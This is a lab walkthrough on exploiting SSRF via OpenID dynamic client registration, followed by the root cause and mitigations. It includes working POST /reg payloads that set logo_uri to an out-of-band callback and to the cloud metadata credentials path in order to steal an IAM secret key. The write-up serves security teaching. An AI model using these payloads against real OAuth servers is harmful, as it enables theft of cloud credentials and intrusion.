# Lab 6 SSRF via OpenID dynamic client registration

This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: `wiener:peter`

***

## Feature Being Attacked

**Dynamic Client Registration** - an OIDC feature (`/reg` endpoint) that lets any client app self-register with the OAuth server (get a `client_id`) without manual approval, by submitting metadata like `redirect_uris`, `logo_uri`, etc.

## Key Problem

**Two flaws combined:**

1. **Unauthenticated registration** - anyone can `POST /reg` and create a new "client application" with arbitrary metadata, no auth required
2. **`logo_uri` is fetched server-side, with no validation** - when the consent/authorize page needs to display the client's logo, the OAuth server itself makes an HTTP request to whatever URL was registered as `logo_uri`, and returns that response to whoever hits `/client/CLIENT-ID/logo`

Combined: **the attacker fully controls a URL that the OAuth server's backend will fetch** → classic SSRF.

## The Exploit Chain

**Step 1 - Confirm the registration endpoint exists**

```
GET /.well-known/openid-configuration
```

→ reveals `/reg` as the registration endpoint (this is standard OIDC discovery).

**Step 2 - Register a client, prove SSRF works (using Collaborator)**

json

```json
POST /reg
{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "https://YOUR-COLLABORATOR-URL"
}
```

Then trigger the fetch:

```
GET /client/CLIENT-ID/logo
```

→ OAuth server fetches `logo_uri` server-side → Collaborator receives the interaction → **confirms SSRF**.

**Step 3 - Weaponize it against cloud metadata**

json

```json
POST /reg
{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

`169.254.169.254` is the **cloud instance metadata endpoint** (AWS-style) - only reachable from _inside_ the server itself, never from the public internet. Since the OAuth server fetches `logo_uri` server-side, it can reach this internal-only address on the attacker's behalf.

**Step 4 - Retrieve the result**

```
GET /client/NEW-CLIENT-ID/logo
```

→ Response body = the metadata service's reply, containing the **cloud provider's secret access key** for the `admin` IAM role.

## Root Cause

> Any user-supplied URL that gets **fetched server-side** (logos, webhooks, avatars, "preview this link," etc.) is a potential SSRF vector - regardless of what feature it's attached to. Here, OIDC's dynamic client registration (a legitimate, spec-defined feature) introduced exactly this pattern via `logo_uri`, and the registration endpoint being open to anyone made it trivially reachable.

## The Fix

* **Restrict/authenticate dynamic client registration** - don't allow arbitrary unauthenticated self-registration in production; require approval or pre-shared secrets
* **Validate `logo_uri` (and any server-fetched URL) strictly:**
  * Allowlist schemes (`https://` only)
  * Block private/reserved IP ranges (`169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`, etc.)
  * Resolve DNS and re-check the resolved IP before fetching (to prevent DNS rebinding bypasses)
  * Ideally, fetch and cache the logo **once at registration time** via a tightly sandboxed fetcher, not on-demand per request

## One-Line Takeaway

> OIDC's dynamic client registration expands the attack surface by adding new user-controlled metadata fields (like `logo_uri`) - any of which, if fetched server-side without validation, becomes a straightforward SSRF vector, especially dangerous when reachable to cloud metadata endpoints holding live credentials.
